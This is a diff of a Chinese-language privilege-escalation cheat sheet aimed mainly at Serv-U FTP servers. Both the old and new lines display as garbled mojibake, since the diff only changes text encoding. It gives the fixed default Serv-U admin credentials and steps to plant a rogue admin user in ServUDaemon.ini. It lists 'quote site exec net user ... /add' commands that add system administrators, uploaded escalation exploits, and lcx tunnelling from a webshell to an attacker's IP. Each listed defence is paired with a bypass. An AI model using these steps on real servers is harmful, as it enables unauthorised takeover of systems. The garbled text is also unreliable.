-			2>ÏÂÔØÊı¾İ¿âÎÄ¼ş´æ´¢±í
+			2>ä¸‹è½½æ•°æ®åº“æ–‡ä»¶å­˜å‚¨è¡¨
 			{	
 				mysql/data/mysql/user.myd
 			}
-			3>±©Á¦ÆÆ½â¹¤¾ß
+			3>æš´åŠ›ç ´è§£å·¥å…·
 			{
-				Hscan£¬hydra£¬x-scan£¬3306±¬ÆÆ
+				Hscanï¼Œhydraï¼Œx-scanï¼Œ3306çˆ†ç ´
 			}
 		}
 
 	}
-	AccesÌáÈ¨£º
+	Accesææƒï¼š
 	{
 		
 	}
-	OracleÌáÈ¨:
+	Oracleææƒ:
 	{
 
-	ĞéÄâÖ÷»úÌáÈ¨:
+	è™šæ‹Ÿä¸»æœºææƒ:
 
-	ĞÇÍâÌáÈ¨
+	æ˜Ÿå¤–ææƒ
 
-	Î÷²¿ÊıÂëÌáÈ¨
+	è¥¿éƒ¨æ•°ç ææƒ
 
-	»ªÖÚĞéÄâÖ÷»úÌáÈ¨
+	åä¼—è™šæ‹Ÿä¸»æœºææƒ
 	}
 }	
-£¨¶ş£©FTPÌáÈ¨
+ï¼ˆäºŒï¼‰FTPææƒ
 {
-	1.server-UÌáÈ¨
+	1.server-Uææƒ
 	{
-		Ô­Àí£ºÂ©¶´ÊÇÊ¹ÓÃServ-u±¾µØÄ¬ÈÏ¹ÜÀí¶Ë¿Ú43958£¬ÒÔÄ¬ÈÏ¹ÜÀíÔ±µÇÂ½ĞÂ½¨ÓòºÍÓÃ»§À´Ö´ĞĞÃüÁî
-			Serv-u>3.x°æ±¾Ä¬ÈÏ±¾µØ¹ÜÀí¶Ë¿ÚÊÇ£º43958£¬Ä¬ÈÏ¹ÜÀíÔ±£ºLocalAdministrator£¬Ä¬ÈÏÃÜÂë£º#l@$ak#.lk;0@P
-		²Ù×÷£º
+		åŸç†ï¼šæ¼æ´æ˜¯ä½¿ç”¨Serv-uæœ¬åœ°é»˜è®¤ç®¡ç†ç«¯å£43958ï¼Œä»¥é»˜è®¤ç®¡ç†å‘˜ç™»é™†æ–°å»ºåŸŸå’Œç”¨æˆ·æ¥æ‰§è¡Œå‘½ä»¤
+			Serv-u>3.xç‰ˆæœ¬é»˜è®¤æœ¬åœ°ç®¡ç†ç«¯å£æ˜¯ï¼š43958ï¼Œé»˜è®¤ç®¡ç†å‘˜ï¼šLocalAdministratorï¼Œé»˜è®¤å¯†ç ï¼š#l@$ak#.lk;0@P
+		æ“ä½œï¼š
 		{
-			1>´óÂíÌáÈ¨
-			2>webshellÖ´ĞĞftpÃüÁîĞĞÌáÈ¨
-			3>server-U±¾µØÒç³öÌáÈ¨
-			4>serv-u ftp±¾µØÒç³öÈ¨ÏŞÌáÉı(Ê¹ÓÃ6.0ÒÔ¼°ÒÔÇ°°æ±¾)
+			1>å¤§é©¬ææƒ
+			2>webshellæ‰§è¡Œftpå‘½ä»¤è¡Œææƒ
+			3>server-Uæœ¬åœ°æº¢å‡ºææƒ
+			4>serv-u ftpæœ¬åœ°æº¢å‡ºæƒé™æå‡(ä½¿ç”¨6.0ä»¥åŠä»¥å‰ç‰ˆæœ¬)
 			{
-				1¡¢ÓÃServ-UÌáÈ¨×ÛºÏ¹¤¾ßÉú³ÉÌáÈ¨¹¤¾ßserv_u.exe
-				2¡¢ÏÈÉÏ´« serv_u.exe µ½Ò»¸öÅÌ·ûÏÂ ±ÈÈçÊÇdÅÌ
-				3¡¢Ö´ĞĞÃüÁî d:\serv_u.exe
-				4¡¢d:\serv_u.exe ¡°net user username password /add¡± (×¢ÒâÃüÁîÒªÓĞÒıºÅ)
-				5¡¢d:\serv_u.exe ¡°net localgroup administrators username /add¡± (×¢ÒâÃüÁîÒªÓĞÒıºÅ)
+				1ã€ç”¨Serv-Uææƒç»¼åˆå·¥å…·ç”Ÿæˆææƒå·¥å…·serv_u.exe
+				2ã€å…ˆä¸Šä¼  serv_u.exe åˆ°ä¸€ä¸ªç›˜ç¬¦ä¸‹ æ¯”å¦‚æ˜¯dç›˜
+				3ã€æ‰§è¡Œå‘½ä»¤ d:\serv_u.exe
+				4ã€d:\serv_u.exe â€œnet user username password /addâ€ (æ³¨æ„å‘½ä»¤è¦æœ‰å¼•å·)
+				5ã€d:\serv_u.exe â€œnet localgroup administrators username /addâ€ (æ³¨æ„å‘½ä»¤è¦æœ‰å¼•å·)
 			}
-			5>serv-UDaemon.iniÎÄ¼şÖØĞ´ÌáÈ¨
+			5>serv-UDaemon.iniæ–‡ä»¶é‡å†™ææƒ
 			{
-				ServUDaemon.ini ÎÄ¼şÖØĞ´ºóÌáÈ¨(¶ÔServUDaemon.iniÓĞĞ´ÈëµÄÈ¨ÏŞ)¡£
-				×¢Òâ£¬ÎÒÔÚserv-u6.4.06ÖĞ²âÊÔÃ»ÓĞ³É¹¦£¬¼´ËäÈ»FTPÓÃ»§Ìí¼Ó³É¹¦£¬µ«Ìí¼ÓµÄÓÃ»§Ã»ÓĞÃüÁîÖ´ĞĞÈ¨ÏŞ£¨ËäÈ»ÏÔÊ¾Ìí¼ÓµÄÓÃ»§ÊÇ¹ÜÀíÔ±ÓÃ»§£©¡£ËùÒÔ£¬ÔÚÊµ¼Ê»·¾³ÖĞ±¾·½·¨²»Ò»¶¨³É¹¦£¬²»¹ıÒª³¢ÊÔÒÔÏÂ¡£
-				ÏÈĞŞ¸ÄDomainÀ´Ìí¼ÓÓÃ»§
+				ServUDaemon.ini æ–‡ä»¶é‡å†™åææƒ(å¯¹ServUDaemon.iniæœ‰å†™å…¥çš„æƒé™)ã€‚
+				æ³¨æ„ï¼Œæˆ‘åœ¨serv-u6.4.06ä¸­æµ‹è¯•æ²¡æœ‰æˆåŠŸï¼Œå³è™½ç„¶FTPç”¨æˆ·æ·»åŠ æˆåŠŸï¼Œä½†æ·»åŠ çš„ç”¨æˆ·æ²¡æœ‰å‘½ä»¤æ‰§è¡Œæƒé™ï¼ˆè™½ç„¶æ˜¾ç¤ºæ·»åŠ çš„ç”¨æˆ·æ˜¯ç®¡ç†å‘˜ç”¨æˆ·ï¼‰ã€‚æ‰€ä»¥ï¼Œåœ¨å®é™…ç¯å¢ƒä¸­æœ¬æ–¹æ³•ä¸ä¸€å®šæˆåŠŸï¼Œä¸è¿‡è¦å°è¯•ä»¥ä¸‹ã€‚
+				å…ˆä¿®æ”¹Domainæ¥æ·»åŠ ç”¨æˆ·
 					[Domain1]
 					User2=spider|1|0
-				È»ºóÔÚServUDaemon.iniÎÄ¼şÎ²²¿×·ÏÂÈçÏÂ´úÂëÀ´Ìí¼ÓÓÃ»§µÄÏêÏ¸ĞÅÏ¢£º
+				ç„¶ååœ¨ServUDaemon.iniæ–‡ä»¶å°¾éƒ¨è¿½ä¸‹å¦‚ä¸‹ä»£ç æ¥æ·»åŠ ç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯ï¼š
 					[USER=spiger|1]
 					Password=sbd8b58b5c201ee5cc20f9a8551197d4a5
 					HomeDir=c:\
@@ -551,388 +551,388 @@ hashÆÆ½âÍøÖ·
 					Access2=d:\|RWAMELCDP
 					Access3=e:\|RWAMELCDP
 					SKEYValues=
-				Ìí¼ÓÉÏÊö´úÂë²¢±£´æºó£¬¾Í»áÔÚserv-uÖĞÌí¼ÓÓÃ»§ÃûÎªspiger£¬ÃÜÂëÊÇ123456¡£
-				Í¨¹ıÔÚ±¾µØÃüÁîĞĞÖ´ĞĞftpÌáÈ¨ÃüÁî£º
+				æ·»åŠ ä¸Šè¿°ä»£ç å¹¶ä¿å­˜åï¼Œå°±ä¼šåœ¨serv-uä¸­æ·»åŠ ç”¨æˆ·åä¸ºspigerï¼Œå¯†ç æ˜¯123456ã€‚
+				é€šè¿‡åœ¨æœ¬åœ°å‘½ä»¤è¡Œæ‰§è¡Œftpææƒå‘½ä»¤ï¼š
 					quote site exec net user spiger 123456 /add
 					quote site exec net localgroup administrators spiger /add
-				ps£ºÉÏÊöÌí¼ÓµÄÎÄ¼şÖĞ×îÖØÒªµÄÊÇMaintenance=SystemÕâ¾ä£¬ÓĞÁËÕâ¾äÌí¼ÓµÄFTPÓÃ»§²ÅÊÇ¹ÜÀíÔ±ÓÃ»§£¬²Å»áÓĞÃüÁîÖ´ĞĞÈ¨ÏŞ£¨ÒòÎª×îºóÊÇÍ¨¹ıFTFPÖ´ĞĞÃüÁîÀ´Ìí¼ÓÏµÍ³ÓÃ»§µÄ£©¡£
+				psï¼šä¸Šè¿°æ·»åŠ çš„æ–‡ä»¶ä¸­æœ€é‡è¦çš„æ˜¯Maintenance=Systemè¿™å¥ï¼Œæœ‰äº†è¿™å¥æ·»åŠ çš„FTPç”¨æˆ·æ‰æ˜¯ç®¡ç†å‘˜ç”¨æˆ·ï¼Œæ‰ä¼šæœ‰å‘½ä»¤æ‰§è¡Œæƒé™ï¼ˆå› ä¸ºæœ€åæ˜¯é€šè¿‡FTFPæ‰§è¡Œå‘½ä»¤æ¥æ·»åŠ ç³»ç»Ÿç”¨æˆ·çš„ï¼‰ã€‚
 			}
-			6>ftp¿ÚÁîÆÆ½â
-				serv-uÅäÖÃÎÄ¼şÎŞĞŞ¸ÄÈ¨ÏŞ£¬µ«ÊÇ¿ÉÒÔ¿´µ½ÅäÖÃÎÄ¼ş£¬½øĞĞ¿ÚÁîÆÆ½â
-				FTPÓÃ»§µÄÅäÖÃÎÄ¼şServUDaemon.ini£¬ÔÚÆäÖĞÕÒµ½Maintenance=SystemµÄÓÃ»§£¬¸ÃÓÃ»§¾ÍÊÇÏµÍ³¹ÜÀíÔ±¡£
-				Èç¹ûÄÜ¹»³É¹¦ÆÆ½âÏµÍ³¹ÜÀíÔ±µÄ¿ÚÁî£¬¾Í¿ÉÒÔÀûÓÃ¸Ã¹ÜÀíÔ±Ö´ĞĞÌí¼ÓÏµÍ³¹ÜÀíÔ±µÄÓÃ»§
-				serv-uÅäÖÃÎÄ¼şÖĞPassword×Ö¶Î¾ÍÊÇÓÃ»§¿ÚÁî¼ÓÃÜ±ä»»ºóµÄ×Ö·û´®
-				ÆÆ½â·½·¨£ºÈ¥µôÇ°Á½Î»£¬Ê£ÏÂµÄ½øĞĞmd5ÆÆ½â£¬ÆÆ½âºóÔÙÈ¥µôÇ°Á½Î»£¬Ê£ÏÂµÄ¾ÍÊÇFTPÓÃ»§¿ÚÁî¡£
-			7>serv-uÅäÖÃÎÄ¼şÎŞĞŞ¸ÄÈ¨ÏŞ£¬¿ÉÒÔÓÃServ-u¹ÜÀíÓÃ»§À´½øĞĞÌáÈ¨£¨ÕâÊÇ×î³£ÓÃµÄ·½·¨£¬Ò»°ã´óÂíÖĞ¼¯³ÉµÄserv-uÌáÈ¨·½·¨¾ÍÊÇ±¾·½·¨£©
-				serv-uµÄÄ¬ÈÏ¹ÜÀí¶Ë¿ÚÊÇ43958£¬Ö»ÓĞ±¾µØ²ÅÄÜ½øĞĞÁ¬½ÓÕâ¸ö¹ÜÀí¶Ë¿Ú¡£serv-uÄ¬ÈÏ¹ÜÀíÕËºÅÊÇLocalAdministrator,Ä¬ÈÏÃÜÂëÊÇ¡±#l@$ak#.lk;0@P¡°£¬Õâ¸öÃÜÂëÊÇ¹Ì¶¨µÄ¡£Èç¹ûÍøÕ¾¹ÜÀíÔ±Íü¼ÇĞŞ¸ÄÃÜÂë£¬ÄÇÃ´»ñÈ¡webshellºó¾Í¿ÉÒÔÁ¬½Ó¸Ã¶Ë¿ÚºóÖ´ĞĞÃüÁîÀ´Ìí¼ÓÏµÍ³ÓÃ»§¡£
-				ËäÈ»£¬ÍøÕ¾¹ÜÀíÔ±ºÜÉÙĞŞ¸Äserv-uµÄÕâ¸öÄ¬ÈÏ¹ÜÀíÕËºÅºÍ¿ÚÁî£¬µ«ÊÇÈç¹û¹ÜÀíÔ±ĞŞ¸ÄÁË£¬ÎÒÃÇ»¹¿ÉÒÔÍ¨¹ı²é¿´ServUAdmin.exeÎÄ¼şÀ´»ñÈ¡¹ÜÀíÕËºÅºÍ¿ÚÁî¡£·½·¨ÈçÏÂ£ºÏÂÔØserv-uÄ¿Â¼ÏÂµÄServUAdmin.exeÎÄ¼ş£¬ÔÚ±¾µØÓÃÎÄ±¾ÎÄ¼ş´ò¿ª£¬²éÕÒLocalAdministrator×Ö·ûÀ´»ñÈ¡¿ÚÁîÎ»ÖÃ£º
-				²Ù×÷£º
+			6>ftpå£ä»¤ç ´è§£
+				serv-ué…ç½®æ–‡ä»¶æ— ä¿®æ”¹æƒé™ï¼Œä½†æ˜¯å¯ä»¥çœ‹åˆ°é…ç½®æ–‡ä»¶ï¼Œè¿›è¡Œå£ä»¤ç ´è§£
+				FTPç”¨æˆ·çš„é…ç½®æ–‡ä»¶ServUDaemon.iniï¼Œåœ¨å…¶ä¸­æ‰¾åˆ°Maintenance=Systemçš„ç”¨æˆ·ï¼Œè¯¥ç”¨æˆ·å°±æ˜¯ç³»ç»Ÿç®¡ç†å‘˜ã€‚
+				å¦‚æœèƒ½å¤ŸæˆåŠŸç ´è§£ç³»ç»Ÿç®¡ç†å‘˜çš„å£ä»¤ï¼Œå°±å¯ä»¥åˆ©ç”¨è¯¥ç®¡ç†å‘˜æ‰§è¡Œæ·»åŠ ç³»ç»Ÿç®¡ç†å‘˜çš„ç”¨æˆ·
+				serv-ué…ç½®æ–‡ä»¶ä¸­Passwordå­—æ®µå°±æ˜¯ç”¨æˆ·å£ä»¤åŠ å¯†å˜æ¢åçš„å­—ç¬¦ä¸²
+				ç ´è§£æ–¹æ³•ï¼šå»æ‰å‰ä¸¤ä½ï¼Œå‰©ä¸‹çš„è¿›è¡Œmd5ç ´è§£ï¼Œç ´è§£åå†å»æ‰å‰ä¸¤ä½ï¼Œå‰©ä¸‹çš„å°±æ˜¯FTPç”¨æˆ·å£ä»¤ã€‚
+			7>serv-ué…ç½®æ–‡ä»¶æ— ä¿®æ”¹æƒé™ï¼Œå¯ä»¥ç”¨Serv-uç®¡ç†ç”¨æˆ·æ¥è¿›è¡Œææƒï¼ˆè¿™æ˜¯æœ€å¸¸ç”¨çš„æ–¹æ³•ï¼Œä¸€èˆ¬å¤§é©¬ä¸­é›†æˆçš„serv-uææƒæ–¹æ³•å°±æ˜¯æœ¬æ–¹æ³•ï¼‰
+				serv-uçš„é»˜è®¤ç®¡ç†ç«¯å£æ˜¯43958ï¼Œåªæœ‰æœ¬åœ°æ‰èƒ½è¿›è¡Œè¿æ¥è¿™ä¸ªç®¡ç†ç«¯å£ã€‚serv-ué»˜è®¤ç®¡ç†è´¦å·æ˜¯LocalAdministrator,é»˜è®¤å¯†ç æ˜¯â€#l@$ak#.lk;0@Pâ€œï¼Œè¿™ä¸ªå¯†ç æ˜¯å›ºå®šçš„ã€‚å¦‚æœç½‘ç«™ç®¡ç†å‘˜å¿˜è®°ä¿®æ”¹å¯†ç ï¼Œé‚£ä¹ˆè·å–webshellåå°±å¯ä»¥è¿æ¥è¯¥ç«¯å£åæ‰§è¡Œå‘½ä»¤æ¥æ·»åŠ ç³»ç»Ÿç”¨æˆ·ã€‚
+				è™½ç„¶ï¼Œç½‘ç«™ç®¡ç†å‘˜å¾ˆå°‘ä¿®æ”¹serv-uçš„è¿™ä¸ªé»˜è®¤ç®¡ç†è´¦å·å’Œå£ä»¤ï¼Œä½†æ˜¯å¦‚æœç®¡ç†å‘˜ä¿®æ”¹äº†ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡æŸ¥çœ‹ServUAdmin.exeæ–‡ä»¶æ¥è·å–ç®¡ç†è´¦å·å’Œå£ä»¤ã€‚æ–¹æ³•å¦‚ä¸‹ï¼šä¸‹è½½serv-uç›®å½•ä¸‹çš„ServUAdmin.exeæ–‡ä»¶ï¼Œåœ¨æœ¬åœ°ç”¨æ–‡æœ¬æ–‡ä»¶æ‰“å¼€ï¼ŒæŸ¥æ‰¾LocalAdministratorå­—ç¬¦æ¥è·å–å£ä»¤ä½ç½®ï¼š
+				æ“ä½œï¼š
 				{
-					ÔÚÄ¿±êWebshellÉÏÔËĞĞLCX£º
-						lcx -slave ÄãµÄIP 5000 127.0.0.1 43958
-					ÔÚ±¾»úÉÏÔËĞĞ£º
+					åœ¨ç›®æ ‡Webshellä¸Šè¿è¡ŒLCXï¼š
+						lcx -slave ä½ çš„IP 5000 127.0.0.1 43958
+					åœ¨æœ¬æœºä¸Šè¿è¡Œï¼š
 						lcx -listen 5000 21
-					´ò¿ª±¾µØµÄSERV_U ÔÚIPÉÏÌîÈë127.0.0.1 ÕÊºÅĞ´LocalAdministrator ÃÜÂë#l@$ak#.lk;0@P
-					´ËÊ±µÄÁ¬½Ó¹ı³ÌÊÇ£º±¾»úÁ¬½Ó21¶Ë¿Ú¡ª¡ª>×ª·¢Íù±¾»ú5000¶Ë¿Ú¡ª¡ª>¹ÜµÀÁ¬½ÓÖÁÔ¶³Ì»ú5000¶Ë¿Ú¡ª¡ª>×ª·¢ÖÁÔ¶³Ì43958¶Ë¿Ú
-					Á¬½Ó³É¹¦ºó£¬ÔÚ±¾»úµÇÂ½Serv_U¾ÍÏàµ±ÓÚµÇÂ½ÁËÔ¶³ÌµÄServ_U¡£
-					Äã¿ÉÒÔFTPµÇÂ½±¾»úIP,ÊäÈëÉÏÃæµÄÕÊºÅºÍÃÜÂë£¬ÔÚÔ¶³ÌFTP·şÎñÆ÷ÉÏÖ´ĞĞÃüÁî¡£
+					æ‰“å¼€æœ¬åœ°çš„SERV_U åœ¨IPä¸Šå¡«å…¥127.0.0.1 å¸å·å†™LocalAdministrator å¯†ç #l@$ak#.lk;0@P
+					æ­¤æ—¶çš„è¿æ¥è¿‡ç¨‹æ˜¯ï¼šæœ¬æœºè¿æ¥21ç«¯å£â€”â€”>è½¬å‘å¾€æœ¬æœº5000ç«¯å£â€”â€”>ç®¡é“è¿æ¥è‡³è¿œç¨‹æœº5000ç«¯å£â€”â€”>è½¬å‘è‡³è¿œç¨‹43958ç«¯å£
+					è¿æ¥æˆåŠŸåï¼Œåœ¨æœ¬æœºç™»é™†Serv_Uå°±ç›¸å½“äºç™»é™†äº†è¿œç¨‹çš„Serv_Uã€‚
+					ä½ å¯ä»¥FTPç™»é™†æœ¬æœºIP,è¾“å…¥ä¸Šé¢çš„å¸å·å’Œå¯†ç ï¼Œåœ¨è¿œç¨‹FTPæœåŠ¡å™¨ä¸Šæ‰§è¡Œå‘½ä»¤ã€‚
 				}
-			8>serv-u7ÖĞ¹ÜÀíÔ±µÄ¿ÚÁîÔÚC:\Program Files\RhinoSoft.com\Serv-U\Users\Local Administrator Domain\.ArchiveÎÄ¼şÖĞ
+			8>serv-u7ä¸­ç®¡ç†å‘˜çš„å£ä»¤åœ¨C:\Program Files\RhinoSoft.com\Serv-U\Users\Local Administrator Domain\.Archiveæ–‡ä»¶ä¸­
 		}
-		·ÀÓùÓëbypass:
-			·À»¤·½·¨1£ºÉèÖÃÄ¿Â¼È¨ÏŞ£¬Í¨¹ıÈ¥µôWebÄ¿Â¼iusrÓÃ»§µÄÖ´ĞĞÈ¨ÏŞÀ´·ÀÖ¹Ê¹ÓÃWebshellÀ´ÔËĞĞExp³ÌĞò¡£
-			¶Ô²ß£ºÕâÖÖ·½·¨ÓĞÒ»¶¨µÄ¾ÖÏŞĞÔ£¬ĞèÒªÉèÖÃµÄÄ¿Â¼ºÜ¶à£¬²»ÄÜÓĞÒ»µãÊèÂ©£¬±ÈÈçÎÒ¾Í·¢ÏÖºÜ¶àĞéÄâÖ÷»úÔÚC:\Documents and Settings\All Users\ DocumentsÄ¿Â¼ÒÔ¼°ÏÂ±ß¼¸¸ö×ÓÄ¿Â¼DocumentsÃ»ÓĞÉèÖÃÈ¨ÏŞ£¬µ¼ÖÂ¿ÉÒÔÔÚÕâ¸öÄ¿Â¼ÉÏ´«²¢ÔËĞĞExp£¬ÕâÖÖÄ¿Â¼»¹ÓĞx:\php,x:\perlµÈ£¬ÒòÎªÕâÖÖÄ¿Â¼¶¼ÊÇeveryoneÍêÈ«¿ØÖÆµÄ¡£ÓĞĞ©Ö÷»ú»¹Ö§³Öphp,pl,aspxµÈ£¬Õâ¼òÖ±¾ÍÊÇ·şÎñÆ÷µÄServ-UÔÖÄÑ£¬ÔËĞĞ³ÌĞò¸ü¼Ó·½±ã¡£
+		é˜²å¾¡ä¸bypass:
+			é˜²æŠ¤æ–¹æ³•1ï¼šè®¾ç½®ç›®å½•æƒé™ï¼Œé€šè¿‡å»æ‰Webç›®å½•iusrç”¨æˆ·çš„æ‰§è¡Œæƒé™æ¥é˜²æ­¢ä½¿ç”¨Webshellæ¥è¿è¡ŒExpç¨‹åºã€‚
+			å¯¹ç­–ï¼šè¿™ç§æ–¹æ³•æœ‰ä¸€å®šçš„å±€é™æ€§ï¼Œéœ€è¦è®¾ç½®çš„ç›®å½•å¾ˆå¤šï¼Œä¸èƒ½æœ‰ä¸€ç‚¹ç–æ¼ï¼Œæ¯”å¦‚æˆ‘å°±å‘ç°å¾ˆå¤šè™šæ‹Ÿä¸»æœºåœ¨C:\Documents and Settings\All Users\ Documentsç›®å½•ä»¥åŠä¸‹è¾¹å‡ ä¸ªå­ç›®å½•Documentsæ²¡æœ‰è®¾ç½®æƒé™ï¼Œå¯¼è‡´å¯ä»¥åœ¨è¿™ä¸ªç›®å½•ä¸Šä¼ å¹¶è¿è¡ŒExpï¼Œè¿™ç§ç›®å½•è¿˜æœ‰x:\php,x:\perlç­‰ï¼Œå› ä¸ºè¿™ç§ç›®å½•éƒ½æ˜¯everyoneå®Œå…¨æ§åˆ¶çš„ã€‚æœ‰äº›ä¸»æœºè¿˜æ”¯æŒphp,pl,aspxç­‰ï¼Œè¿™ç®€ç›´å°±æ˜¯æœåŠ¡å™¨çš„Serv-Uç¾éš¾ï¼Œè¿è¡Œç¨‹åºæ›´åŠ æ–¹ä¾¿ã€‚
 			
-			·À»¤·½·¨2£ºĞŞ¸ÄServ-u¹ÜÀí¶Ë¿Ú£¬ÓÃUltraedit´ò¿ªServUDaemon.exe²éÕÒB6AB(43958µÄ16½øÖÆ)£¬Ìæ»»³É×Ô¼º¶¨ÒåµÄ¶Ë¿Ú±ÈÈç3930£¨12345£©£¬´ò¿ªServUAdmin.exeÕÒµ½×îºóÒ»¸öB6ABÌæ»»³É3930£¨12345£©,Æô¶¯Serv-u£¬ÏÖÔÚ±¾µØ¹ÜÀí¶Ë¿Ú¾Í³ÉÁË12345ÁË£º
+			é˜²æŠ¤æ–¹æ³•2ï¼šä¿®æ”¹Serv-uç®¡ç†ç«¯å£ï¼Œç”¨Ultraeditæ‰“å¼€ServUDaemon.exeæŸ¥æ‰¾B6AB(43958çš„16è¿›åˆ¶)ï¼Œæ›¿æ¢æˆè‡ªå·±å®šä¹‰çš„ç«¯å£æ¯”å¦‚3930ï¼ˆ12345ï¼‰ï¼Œæ‰“å¼€ServUAdmin.exeæ‰¾åˆ°æœ€åä¸€ä¸ªB6ABæ›¿æ¢æˆ3930ï¼ˆ12345ï¼‰,å¯åŠ¨Serv-uï¼Œç°åœ¨æœ¬åœ°ç®¡ç†ç«¯å£å°±æˆäº†12345äº†ï¼š
 						TCP 127.0.0.1:12345 0.0.0.0:0 LISTENING
-			¶Ô²ß£ºnetstat ¨Can,¾ÍÄÜ¿´µ½¶Ë¿ÚÁË£¬ÓĞÈËËµnetstatÎŞ·¨ÔËĞĞ£¬ÆäÊµÄãÔÙÉÏ´«¸önetstat.exeµ½¿ÉÖ´ĞĞÄ¿Â¼ÔËĞĞ¾ÍokÁË£¬È»ºóĞŞ¸ÄÒ»ÏÂExp±àÒë£¬ÉÏ´«ÔËĞĞ¾ÍºÃÁË£¬ÎÒĞŞ¸ÄÁËÒ»¸ö¿ÉÒÔ×Ô¶¨Òå¶Ë¿ÚµÄExp,ÔËĞĞ¸ñÊ½£º
+			å¯¹ç­–ï¼šnetstat â€“an,å°±èƒ½çœ‹åˆ°ç«¯å£äº†ï¼Œæœ‰äººè¯´netstatæ— æ³•è¿è¡Œï¼Œå…¶å®ä½ å†ä¸Šä¼ ä¸ªnetstat.exeåˆ°å¯æ‰§è¡Œç›®å½•è¿è¡Œå°±okäº†ï¼Œç„¶åä¿®æ”¹ä¸€ä¸‹Expç¼–è¯‘ï¼Œä¸Šä¼ è¿è¡Œå°±å¥½äº†ï¼Œæˆ‘ä¿®æ”¹äº†ä¸€ä¸ªå¯ä»¥è‡ªå®šä¹‰ç«¯å£çš„Exp,è¿è¡Œæ ¼å¼ï¼š
 				USAGE: serv-u.exe port "command"
 				Example: serv-u.exe 43958 "net user xl xiaoxue /add"
-			·À»¤·½·¨3£ºĞŞ¸Ä¹ÜÀíÔ±ÃûºÍÃÜÂë£¬ÓÃUltraedit´ò¿ªServUDaemon.exe²éÕÒAscii£ºLocalAdministrator£¬ºÍ#l@$ak#.lk;0@P£¬ĞŞ¸Ä³ÉµÈ³¤¶ÈµÄÆäËü×Ö·û¾Í¿ÉÒÔÁË£¬ServUAdmin.exeÒ²Ò»Ñù´¦Àí¡£
-			¶Ô²ß£ºÓĞµÄ¹ÜÀíÔ±°²×°Serv-u¶¼ÊÇÊ¹ÓÃÄ¬ÈÏÄ¿Â¼C:\Program Files\Serv-U°²×°£¬Õâ¸öÄ¿Â¼ËäÈ»²»ÄÜĞ´£¬Ò²²»ÄÜĞŞ¸Ä£¬µ«ÊÇÄ¬ÈÏiusrÊÇ¿ÉÒÔ¶ÁµÄ£¬ÎÒÃÇ¿ÉÒÔÓÃwebshellÀ´ÏÂÔØServUDaemon.exe£¬ÓÃUltraedit´ò¿ª·ÖÎöÒ»ÏÂ£¬»ñÈ¡Serv-UµÄÕÊºÅÃÜÂë£¬ĞŞ¸ÄExp±àÒëÉÏ´«ÔËĞĞ¡£
+			é˜²æŠ¤æ–¹æ³•3ï¼šä¿®æ”¹ç®¡ç†å‘˜åå’Œå¯†ç ï¼Œç”¨Ultraeditæ‰“å¼€ServUDaemon.exeæŸ¥æ‰¾Asciiï¼šLocalAdministratorï¼Œå’Œ#l@$ak#.lk;0@Pï¼Œä¿®æ”¹æˆç­‰é•¿åº¦çš„å…¶å®ƒå­—ç¬¦å°±å¯ä»¥äº†ï¼ŒServUAdmin.exeä¹Ÿä¸€æ ·å¤„ç†ã€‚
+			å¯¹ç­–ï¼šæœ‰çš„ç®¡ç†å‘˜å®‰è£…Serv-uéƒ½æ˜¯ä½¿ç”¨é»˜è®¤ç›®å½•C:\Program Files\Serv-Uå®‰è£…ï¼Œè¿™ä¸ªç›®å½•è™½ç„¶ä¸èƒ½å†™ï¼Œä¹Ÿä¸èƒ½ä¿®æ”¹ï¼Œä½†æ˜¯é»˜è®¤iusræ˜¯å¯ä»¥è¯»çš„ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨webshellæ¥ä¸‹è½½ServUDaemon.exeï¼Œç”¨Ultraeditæ‰“å¼€åˆ†æä¸€ä¸‹ï¼Œè·å–Serv-Uçš„å¸å·å¯†ç ï¼Œä¿®æ”¹Expç¼–è¯‘ä¸Šä¼ è¿è¡Œã€‚
 			
-			ÖÕ¼«·ÀÓù£º
-				a.ÉèÖÃºÃÄ¿Â¼È¨ÏŞ£¬²»ÒªÊèºö´óÒâ£»
-				b.Serv-U×îºÃ²»ÒªÊ¹ÓÃÄ¬ÈÏ°²×°Â·¾¶£¬ÉèÖÃServ-UÄ¿Â¼µÄÈ¨ÏŞ£¬Ö»ÓĞ¹ÜÀíÔ±²ÅÄÜ·ÃÎÊ£»
-				c.ÓÃÎÒ½éÉÜµÄ°ì·¨ĞŞ¸ÄServ-UµÄÄ¬ÈÏ¹ÜÀíÔ±Ãû×ÖºÍÃÜÂë£¬Ï²»¶µÄ»°¶Ë¿ÚÒ²¿ÉÒÔ¸Äµô¡£
+			ç»ˆæé˜²å¾¡ï¼š
+				a.è®¾ç½®å¥½ç›®å½•æƒé™ï¼Œä¸è¦ç–å¿½å¤§æ„ï¼›
+				b.Serv-Uæœ€å¥½ä¸è¦ä½¿ç”¨é»˜è®¤å®‰è£…è·¯å¾„ï¼Œè®¾ç½®Serv-Uç›®å½•çš„æƒé™ï¼Œåªæœ‰ç®¡ç†å‘˜æ‰èƒ½è®¿é—®ï¼›
+				c.ç”¨æˆ‘ä»‹ç»çš„åŠæ³•ä¿®æ”¹Serv-Uçš„é»˜è®¤ç®¡ç†å‘˜åå­—å’Œå¯†ç ï¼Œå–œæ¬¢çš„è¯ç«¯å£ä¹Ÿå¯ä»¥æ”¹æ‰ã€‚
 	}
-	2.FTPÃüÁîĞĞÌáÈ¨
+	2.FTPå‘½ä»¤è¡Œææƒ
 	{
 		cmd
 		ftp
 		open 192.168.1.100 60000
-		quote site exec net user username password /add »Ø³µ
-		quote site exec net localgroup administrators username /add »Ø³µ
+		quote site exec net user username password /add å›è½¦
+		quote site exec net localgroup administrators username /add å›è½¦
 	}
-	3.´óÂíÌáÈ¨
+	3.å¤§é©¬ææƒ
 	{
-			ÓÃ»§Ãû:	LocalAdministrator
-			¿Ú Áî£º	#l@$ak#.lk;0@P
-			¶Ë ¿Ú£º	43958
-			ÏµÍ³Â·¾¶£º 	c:
-			Ãü¡¡Áî£º cmd /c net user username password /add & net localgroup administrators username /add
+			ç”¨æˆ·å:	LocalAdministrator
+			å£ ä»¤ï¼š	#l@$ak#.lk;0@P
+			ç«¯ å£ï¼š	43958
+			ç³»ç»Ÿè·¯å¾„ï¼š 	c:
+			å‘½ã€€ä»¤ï¼š cmd /c net user username password /add & net localgroup administrators username /add
 	}
-	3.G6-FTPÌáÈ¨
-	{
-		
-	}
-	4.FileZillaÌáÈ¨
+	3.G6-FTPææƒ
 	{
 		
 	}
-	5.FlashFXPÌáÈ¨
+	4.FileZillaææƒ
 	{
 		
 	}
-	6.PcAnywhereÌáÈ¨
